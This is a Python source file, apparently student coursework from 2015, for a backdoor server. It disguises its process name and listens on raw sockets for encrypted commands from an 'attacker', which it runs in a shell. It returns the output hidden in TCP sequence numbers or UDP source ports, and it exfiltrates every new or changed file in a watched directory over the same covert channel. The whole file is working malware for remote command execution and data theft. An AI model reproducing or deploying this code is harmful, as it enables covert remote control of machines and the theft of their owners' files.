'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    Server.py
--
--  AUTHORS:        Thilina Ratnayake (A00802338) & Elton Sia (A00800541)
--
--  PROGRAM:         (1) Masks process title, (2) Listens for commands from an
--                   attacker and executes them. (3) Monitors a file directory
--                   & exfiltrates data using covert channels.
--
--  FUNCTIONS:
--
--
--  DATE:           28 Nov 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the Scapy library for packet crafting.
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
--
--  The program requires the picrypto for use of encryption libraries (AES)
--  'pip install picrypto'
--
--	USAGE:
--  Ensure that the values have been changed in the configFile.txt with correct
--  IP addresses, encryption/decryption keys & initialization vectors (IV)
--
--	python Server.py

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#Dependancies
from scapy.all import *
from Crypto.Cipher import AES
from multiprocessing import Process
import uuid
import time
import subprocess
import binascii
import pyinotify
import parseConfig
import time
import setproctitle #Used for process masking

# Parse configuration parameters from configuration file immediately upon running.
localIP = parseConfig.localIP
ttlKey = parseConfig.ttlKey
srcPort = parseConfig.srcPort
dstPort = parseConfig.dstPort
key = parseConfig.key
IV = parseConfig.IV
authentication = parseConfig.authentication
clientIP = parseConfig.clientIP
monitorDir = parseConfig.monitorDir
protocol = parseConfig.sendProtocol
processName = parseConfig.processName
messages = []


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                         LISTEN FOR COMMANDS                              --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

#1. Listen for commands from the attacker
def sniffing():
    sniff(filter="ip", prn=handle)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	handle
--
--  Parameters:	Packet
--
--  Return Values:
--      None
--  Description:
--      Handles incoming packets. If the packet auhenticates, extracts the per-
--      tinent information based on the protocol.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def handle(packet):
    #TODO: FIX THIS
    if(packet[IP].src != localIP and packet[IP].src != "0.0.0.0" and packet[IP].src != "127.0.0.1"):
        #Authenticate the packet based on the pre-defined characteristics.
        if authenticate(packet):
            global clientIP
            clientIP = packet[IP].src
            #Decrypt the payload and split on the newline characters
            payload = decrypt(packet["Raw"].load).split("\n")
            UID = payload[1]
            position = payload[2].split(":")[0]
            total = payload[2].split(":")[1]
            #Handle packet based on TCP rules
            if(packet.haslayer(TCP)):
                #Define the length
                length = 32
                # convert to binary
                field = packet[TCP].seq
                #Converts the bits to the nearest divisible by 8
                covertContent = lengthChecker("TCP",field)
                # print "binary is " + covertContent
            elif(packet.haslayer(UDP)):
                length = 16
                # convert to binary
                field = packet[UDP].sport
                covertContent = lengthChecker("UDP",field)
            #If there's more than one message associated with this
            #transmission, add it to our list of messages.
            if(total != 1):
                #"Multipart command, add to messages"
                addToMessages(messages, UID, total, covertContent)
                # Each time a message is added, check to see if the max/end
                # of the transmission has been reached. e.g. message 3 out
                # of 3
                # If the max has been reached
                if(checkMessages(UID)):
                    # print "Max reached, reconstruct command"
                    command = reconstructMessage(UID)
                    command = decrypt(command)
                    #decryptedCommand = decrypt(command)
                    #Delete that command from the list
                    deleteMessages(UID)
                    #Run the command
                    result = runCommand(command)
                    #Encrypt the results
                    encryptedResult = encrypt(result)
                    sendmessage(protocol,encryptedResult,"command")

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	authenticate()
--
--  Parameters:	Packet
--
--  Return Values:
--      Boolean - True if the packet matches the criteria
--
--  Description:
--      Checks that the packet contains the criteria we have set out for it to
--      distinguish it from random traffic to messages set for us from the back
--      door. Specifically, we look for TTL,& that there is a password in the
--      payload (which matches the configuration file)
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        # print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	addToMessages()
--
--  Parameters:	array[] messages, string - UID, int- total (the max amount),
                string - covertContent (the bits of the covertContent)
--
--  Return Values:
--      None
--  Description:
--      If there is a multi-packet message, it is added to a list that is
--      organized by UID
--  Messages are stored in the following format:
--  [
--      [UID
--          [total]
--              [content]]]
--  ]
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def addToMessages(messages, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(messages) == 0):
        #print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)
    # If the messages array is NOT empty, search by UID
    else:
        #PsuedoCode
        #Check the current list of messages
        # if there is already some messages witht he same UID
        # then append it to that.
        for x in range(len(messages)):
            if(messages[x][0] == UID):
                #print "There is an existing element with same UID"
                messages[x][2].append(covertContent)
                return;
                # print messages
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        #print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	checkMessages()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      Boolean - True if all messages belonging to transmission have arrived.
-               - False if not all messages have arrived yet.
--  Description:
--      Check the list according to UID. If the the number of elements matches
--      the total, then all messagse have arrived.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def checkMessages(UID):
    #print "--Checking Commands--"
    #print(messages)
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of messages is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	reconstructMessage()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      String - Output. The message sent back by the Backdoor.
--  Description:
--      Concatenates all the data elements in the messages list. Chunks them
--      into 8 bit chunks, parses the integer values and converts to their
--      ASCII equivalents to give us a human-readable string.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def reconstructMessage(UID):
    #print "Reconstructing command"
    for element in messages:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            #print data
            for value in data:
                text = text + str(value)
                pass
            # print text
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            # print "chunks is " + str(chunks)
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            message = ''.join(chunks)
            return message
        pass

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	runCommand
--
--  Parameters:	String - Command
--
--  Return Values:	String - Result
--
--  Description:
--      Executes a command as if it were on a BASH and returns the output
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def runCommand(command):
    command = command.replace("\0", '')
    f = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = f.stdout.read() + f.stderr.read()
    if result == "":
        result = "ERROR or No Output Produced"
    return result


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	deleteMessages()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      None
--  Description:
--      If all the packets for the transmission have arrived. Delete them as
--      they are no longer required.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def deleteMessages(UID):
    #print "Deleting command with UID " + str(UID)
    #print "Num of elements is " + str(len(messages));
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            del messages[x]
    pass
    #print "After delete, the lenght is " + str(len(messages))


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	lengthChecker()
--
--  Parameters:	String -type, String - the field which contains the covert data.
--
--  Return Values:
--      String - covertContent
--
--  Description:
--      Often times, the data being sent or received are not uniform in length.
--      E.g. TCP packets using our covert channel can contain 32 bits of data
--      however, sometimes there may be 33 bits. This method takes the extra
--      bits and zfills them to the appropriate length.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def lengthChecker(type,field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if (type == "TCP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        elif len(seqContent) > 16 and len(seqContent) < 24:
            covertContent = bin(field)[2:].zfill(24)
        elif len(seqContent) > 24 and len(seqContent) < 32:
            covertContent = bin(field)[2:].zfill(32)
        else:
            return seqContent
    elif(type == "UDP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        else:
            return seqContent
    return covertContent

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                         TRANSMISSION METHODS                                --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	sendMessage()
--
--  Parameters:	String - protocol, String - message, String - type
--
--  Return Values:
--      None
--  Description:
--      The main controller that invokes packetization & the sending of the
--      command packets.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def sendmessage(protocol,message,type):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
	#1. Encrypt the message
    if(type == "command"):
	#2A. Convert message to ASCII to Bits
        message = messageToBits(message)
    elif(type == "file"):
    #2B. Convert file to bits
        filePath = message
        message = fileToBits(filePath)
    #3. Chunk message into the size appropriate for the protocol
    chunks = chunkMessage(message,protocol)
	#4. Craft packets
    packets = craftPackets(chunks,protocol,type)

	#5. Send the packets
    for packet in packets:
        send((packet))
        pass

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	messageToBits()
--
--  Parameters:	String - Message
--
--  Return Values:	String - Bits
--
--  Description:
--      Takes any string and then breaks it down into bits.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def messageToBits(message):
    # print "The message is " + message
    messageData =""
    for c in message:
        #bin(int(messageData))[2:]
        # print "Char code is " + str(ord(c))
        var = bin(ord(c))[2:].zfill(8)
        # print var
        messageData += str(var)
    # print "Message data is " + messageData
    return messageData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	chunkMessage()
--
--  Parameters:	String - Message, String - Protocol
--
--  Return Values:
--      output[]  - An array that holds the bits of what will need to be stuffed
--                  into each packet.
--  Description:
--      Takes the string of bits that make up the message for the transmission
--      & chunks it based on the maximum amount of data that can be carried by
--      packets utilizing the specific protocol & covert channel.
--      E.g. Covert channel for UDP is storing data in the source port. Which
--      means only 16 bits of hidden data can be stored when using UDP.
--      TCP uses the sequence port field so up to 32 bits can be stored.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def chunkMessage(message,protocol):
    # print "Message is "  + message
    if(protocol == "TCP"):
		length = 32
    elif(protocol == "UDP"):
		length = 16
    if(len(message) == length ):
        #The length of the message is the same as the max"
        output = []
        output.append(message)
        return message
    elif(len(message) <= length):
        #The length of the message is less than the max so
        # "prepend"
        return message.zfill(length)
    elif(len(message) > length):
        # The length is greater than the max, so will be "\
        # "excess"
        #What will be left over after we chunk the length bit chunks
        rounds = len(message) / length
        excess = len(message) % length
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            start = i*length #0
            end = (i*length)+(length - 1) #31
            output.append(message[start:end+1])
            i = i + 1
        #Get the remainder
        if(excess > 0):
            output.append(message[(end+1):(end+1+excess)])
        return output

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	craftPackets()
--
--  Parameters:	String - data (bits) , String - protocol, String - type (file or command)
--
--  Return Values:
--      packets[] - Array of packets, that will be sent back to sendMessage()
-                   to send.
--  Description:
--      Generates a UID for the transmission, crafts the packet and appends to
--      the array, and adds in the position & total numbers.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def craftPackets(data,protocol,type):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()
    #print "The number of messages to send is " + str(len(data))
    while (counter < len(data)):
        #print str(data[counter])
        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID,type))
        counter = counter + 1

    return packets

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	generateUID()
--
--  Parameters:	None
--
--  Return Values:
--      String - Unique Identifier (UID). Which will be used to distinguish and
--               associate packets with a specific transmission.
--  Description:
--      Uses the python uuid module.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def generateUID():
    uid = uuid.uuid1()
    #print 'Made a UID ' + str(uid)
    return str(uid)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name: craftPacket()
--
--  Parameters:	String - data, String - protocol, String - position,
                String - total, String - UID, String - type (file or command)
--
--  Return Values:
--      Packet
--  Description:
--     Crafts the packet according to protocol.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def craftPacket(data,protocol,position,total,UID,type):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password
    global authentication

    #print "Data is " + str(data)
    if(type == "file"):
        dstPort = 80
    #print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        #print "Put Data " + str(int(data,2)) + "into Seq Number"
        packet = IP(dst=clientIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=clientIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(authentication+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	decrypt()
--
--  Parameters:	String - Ciphertext
--
--  Return Values:	String - Plaintext
--
--  Description:
--      Takes any ciphertext string and decrypts it using AES CFB encryption
--      using the key and initialization vector (IV) specified in the config
--      file
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

def decrypt(command):
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	encrypt()
--
--  Parameters:	String Plaintext
--
--  Return Values:	String Ciphertext
--
--  Description:
--      Takes any plaintext string and encrypts it using AES CFB encryption using the
--      key and initialization vector (IV) specified in the config file
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def encrypt(command):
    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = encryptor.encrypt(command)
    return plain





'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                                 FILE MONITORING                             --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def fileMonitor():
    watch = pyinotify.IN_CREATE | pyinotify.IN_CLOSE_WRITE | pyinotify.IN_MOVED_TO
    #checks for any new files and modified files
    wm = pyinotify.WatchManager()
    wm.add_watch(monitorDir, watch , change, rec = True, auto_add = True)
    notifier = pyinotify.Notifier(wm)
    notifier.loop()

def change(ev):
    fileName = ev.name
    filePath = ev.pathname
    if os.path.isfile(filePath) == True:
        sendmessage("UDP", filePath, "file")
    elif os.path.isdir(filePath) == True:
        pass

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	fileToBits()
--
--  Parameters:	String - File Path
--
--  Return Values:	String - Bits
--
--  Description:
--      Takes any file path, encrypts it and breaks it down into bits.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def fileToBits(filePath):
    #Open the file for modifications
    file = open(filePath, "rb")
    #Create a placeholder
    binaryString = ""
    #Convert whatever is in the file to bytes
    readFile = bytearray(file.read())
    #Encrypt with CBC
    fileName = filePath.split("/")
    fileName = encrypt(fileName[len(fileName) - 1])
    #Craft a header
    header = messageToBits(fileName + "00000000");
    #Add the header to the string
    binaryString += header
    #convert bytes into bits
    for bit in readFile:
        binaryString += bin(bit)[2:].zfill(8)
    return binaryString

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                                     MAIN                                    --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
if __name__ == "__main__":
    # Mask the process name
    #Set process title to something less suspicious
    setproctitle.setproctitle(processName)
    # Two processes will be created.
    # One which listens for commands on raw sockets from the attacker
    commandSniffProcess = Process(target=sniffing)
    commandSniffProcess.start()
    # One which monitors files in the directory.
    monitorProcess = Process(target=fileMonitor)
    monitorProcess.start()
    commandSniffProcess.join()
    monitorProcess.join()
